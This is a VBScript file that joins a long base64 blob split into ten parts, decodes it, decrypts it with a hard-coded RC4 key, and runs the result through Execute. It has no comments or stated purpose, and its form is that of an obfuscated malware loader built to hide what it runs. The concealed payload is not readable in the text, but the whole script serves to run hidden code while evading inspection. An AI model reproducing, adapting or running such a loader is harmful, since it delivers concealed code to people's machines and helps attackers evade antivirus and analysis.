Option Explicit

Dim rc4Key: rc4Key = "AndezzzWW"

Dim parts(9)
parts(0) = "CC/zHExiHtuDsDBdxCFeUI9yIxBR2ewfWiLLU1DB69v1BnNUqh6wJaXtZ0TNzYuYj4PUBH5kOU6v9GZPNuCtxH1JxmmY1Qr9flZ4bs2oAVzuAAi9zKJW2F46eNIMEPG+EyXRaubTxyQ0na5PvHcxjiY2bImp1iyasm0P44+xDLUlHE/AynFs6Y8EbFYZQPaDSkkyv49y73SDPMLG8d4PFxI4hqjuZApfQ9QRfUpNof05qpJaZvm3qTUhWads6O0/SxMxH0zoqWnuNEGXfFGJPbn8vhmGx3dbfd/0TOyoY8OZ3sKFW11lWfNCtrM/9gxmYoGLUYTue9FkWPL8cSRT+95ZITe5cbwYC+BB0CVn1BUGB8H/iifQ7E3uliWCRkw/IW3H/q6igB8tJZYt4B/EseZ2WuoQeWCmvaLlGMo+sP1GuTYb3+jzbzKh3AqFrKObatQeOUdFyqEB1rkGIYYdxi+bRfjJqFcHNoM93KeyEox+AnhSOWRBA"
parts(1) = "IqydVRVTsVABLhCHB+h6fToYy7T6C9yjdghOJ1nqU4t7sVjRXsFUocAmgDHJ86otzgoncuExZYQyofOwlqZhg3Vtgch2032hM0UHdn4ezWJzAki9SckCkWPijaXukPH6SvEG4efAx5U/mCRCfndC80u2jyCQwZIFMXcc10t2hnKmX12z6UWMn7L0hTPnqJyejZe7gd5k8o8WVHJ+X0zkktbsPFdINVavRQnpb6xJet++TRwllszj2qQUx/hpI/ADZYAbdxE4NqRl9dGP24H4dB/X9bL9/794PZuw/hSGtb1C+SSPtc7vHAFZgk2TtH+e1ROuyemWKY"
parts(2) = "w17ez6f+3jJ1DPQRsO/7paDicQu20UJr8FZI8W0UT+kwgYQi/P7gffq9xJuUNQz3ZiMTsRZX/WbP2wgZzDSBejGZMe/getee+6Nq6m3p9H6MTsYDzkRwk3+ASxo0k3SIlYmtVz5gcm+Qdu/PjeTRTsRyg7LmH/yftHGyN9L9pJlmGsNub2AMJnowcUf3WCmlp6mHJFOZC+18Q/srg2VFjc9paY07nZHq2gAVWhpako0CjYfc1IHzVWUDWx+Dj0X9Mq9005Z+iYJ1"
parts(3) = "g82YD+xXVF8y0onpZuUSmy+zlOripRQMSkc+ypP0yftyjytCWMK9xlfcHtNgpdtGRd8bHonMaHZyCu0w2SwBv40SSDE5LouOgNDEv4hCT1QWPJlFpYUPzTp60YlvpAgz1vJwV3219kkAbY4jHcnjwQLFL78rM/ST8ouXxWItFcgtViLuS9rpRHMccZgsnHOJBE/d9RNk5cd79jU/D9HQlUrWxUd6BIj7WaqpUECMxjUDhH6rk0YcHniPsMRxRtkJOnmGmg4UlprjgHLGCBmVxySRjhu03T8yMJYW5frGBmGLIYHPeAS8pO1r2VxzweRsYlF3W+QI45Z+P5SpgFpUv9Qxr6TyTDXw9Wajdt0T5YaQi5a4/mFGmRGVuO8rURLDBhukZxPnzO+kYnwEmNEsQO1MlJP8taM3r6KSZKs6xvmbUS5KWAFLhSIVPthVM84Dex26hpGYj2XY/EVnG6HnDW1iuDX/0gNyQOSl+1z2Wj/hVq2IGPY54mVNWnAQW2eruUog7Zrh/Y/4J1wzGZWqCcozCSyPaABHm9tQGyS2"
parts(4) = "1gCH4pa3hvu5Z+b8BPQ9MoWvY4wyOKxV1KnGUTLKpc0iQ9BmnC63tyfN9GXsW/6+OrguEg0JD5anHk/23gKomAGT8R6j7fIzxkn0vF37q8skhxFKnIVg9gF3Du"
parts(5) = "zs0ReadZtBsa6drSRTHJNrH6uzb/T7FqChQBMWvvyrzQn0/y3PFi6wzcDR3anl9jEVPdZIeBLnzBs1IR6qkA3LAmNn3NHRjkNIjHWlUlEVcgFZNJM6cRmEuJnm1g35g8jt6jQmaXVrepd7NO7cQ7PqIyqnaBhnci7mZue3bqRVGVcfQAyHaae8eWVftPFZTH7qz3FeexwBCWVlNAyA7Zk7Sj64rOMqNiXKcdW10bcm8mOkTPIH21gX22i/ridsx0hxROS/Q381Z1jwYNUQtdkxwCwYcMMl43TsrLSuwRFTWIc1dE5fuAwbM4oaIXk0yfA3zsm+sMhYnpaoblspBzfwnZovm7oPgGOXNn5CXkjuXYs3uAoELGAuOYlDu7ZjduBVS/V2dTJNXjYQMNB2ETh0hDB5pW5Ifgd2QqiKpSLwLdjBQaXcOx9NvI5tGlokdCgMGeDelEzTbtDWrHwyQkiaYcP8ajaj9BNcJkVSsFHrj3cdzufYGcl/qZxXLqU2gvMn/JpA6PmtT42jcKcxmysi1JubonTB1UF7fylhce+5WOuMwJg8Lk6kS9ENaHQ0FET69xHs+MOCLGcnT8aDt0Iwp/aKF/Vr11cKWsLxfbZ"
parts(6) = "RsMF22CY59CAOrpJk3APf28b5BCxbgvJqGcoGnaLUF5vp7FwMUHdVf4UU7VTq8srLXUl3zulDwmocHZpAV7F+RLS38EnZUKtgOejB5iInlsM28IMFNZjtvmsEddltGHPeWsunp1FxaV/dS9ORhIXdJ1AzWkZUiXT0x/Bi3MZU15uT8eQLDdEhvl7oibjjZsmWEMUIJ7apwCKCPPm3uefQE6e50jYaKQtkWb5wfFBUMF7UVU4f68PEnqxlY/Vz1fyRbp12WnZObGwfkXjp3ZG/6E/q0dO3uRaeD9WcBQV4nFBIshSfvnk7VD8Adei77H0GmwPlkLvjtFBme/b3M+t6RrLb2kxPaosPBWlFdPPiaPZqCsPzeXj7ywD7Z1V1TqOykFZaONQ8GXuT9doFNLuJ5N3bKAxvXJBzBSOxj+2CVufiYDf5XNVRDHsmMhJsVkTLrPICByMMcbeOLSG68BHiSMrkVgC0PDqWg"
parts(7) = "2doCAo9trQi8D86f3b9mT8myZtD4R4XHbfiZ0tnkv+ioEgM9OlEtc9O7U0vNuz2+E6cS67iw7OuF0dyVXb4yoravL4f/9EoM+mI3HXVtXqJ+ksEJjdfsTuuXmgNSyjkKIh2flrd0nOOPbYeHoote2SaZjeMPuddXo5VjmpwdIsEkHGtIK1QgX871Rep1klEbIKVnQByJUBc9GyS6HV0YmCOuY1p3BoLuCiRil2pR6MeZmTHNzgw6e4rD1uojEkA+QCij8eGn7vRJgxclMG0Ecifih7kFSJ1P5Ov140U1haF/Avkpsl9C8BfTGjWcaxNeo/9USPnrI65YlHkMM+0K76updNGpYzSpAQPQ41+N81L7u4IICyO+U+ryAk7as2Q+K9ljDm40iobno5hbQLdqD"
parts(8) = "b4gWywbyh1iKz3nI0+dq0zmhWExJEfJw3dQk9KOF+yex9raYICFLy/ugnUOkm0Q51OPl7KPgCBSMLUUDM8EfD30wtUU4wWSRnVu18h0ocBeXB3ZPaNp/jlM4G/MPPAW/ezzM83PAapEhjhseH4CjOntW6oJluR9jZRib/PznCGZqvjP5O3ogCrytfM6XgKEA/FbYCJPWkt/5RpP8VoL+Uh3YnIogj0UniGmsaNKTi/pkeG1O2iebA6D3NTrVEpvUnNEDKQZHnBHjbA5oQLHRI1YGEAj2JuAMhE/3znE5PH8YMoDHkPRilwboE4UbF/xByTzmUHf8SAZAfM/Rfu9eJIXnWAeJVPX03bs562pyn3ZNyuNgPOuo7cci2yTIJvryBkPkGYKaAh2QUXK2"
parts(9) = "KvmBcNmKqdQ+Sk4E22A2/V3FoOlHkVmeq3kNMCZ8okojnIfPmpXapIccAzT4DWTfOUBwN7toRQJQO0cLtiz+69T0CVemldqpWN0ipUZr9RiZL2nOn+F/gbNmiNImm/OX/83qUdz3Pb20Dpt2WeuHwhnzx9jofm6be6ftLLvyBfRdxfGnnCBFo7gsO/46RosnPlW2rkHinDGEejB3j9x3UtOsbcMipcXPGrFVFrbwPkZ5vcF1KwSSB9soCOLr6vauRV8rgzIKgWo+4a1jKf8x2K0GpHpdHZTbt5FreEEQ/5MBFENwDLNhwfK+3o="

Dim encoded: encoded = ""
Dim i
For i = 0 To 9
    encoded = encoded & parts(i)
Next

Function Base64Decode(ByVal base64)
    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
    Dim node: Set node = xml.CreateElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64
    Base64Decode = node.nodeTypedValue
End Function

Function RC4Decrypt(ByVal data, ByVal key)
    Dim S(255), i, j, k, temp, result
    result = ""
    For i = 0 To 255
        S(i) = i
    Next
    j = 0
    For i = 0 To 255
        j = (j + S(i) + Asc(Mid(key, (i Mod Len(key)) + 1, 1))) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
    Next
    i = 0: j = 0
    For k = 1 To LenB(data)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        temp = S(i)
        S(i) = S(j)
        S(j) = temp
        Dim t: t = (S(i) + S(j)) Mod 256
        Dim b: b = AscB(MidB(data, k, 1))
        result = result & Chr(b Xor S(t))
    Next
    RC4Decrypt = result
End Function

Dim decodedBytes: decodedBytes = Base64Decode(encoded)
Dim decrypted: decrypted = RC4Decrypt(decodedBytes, rc4Key)

Execute decrypted
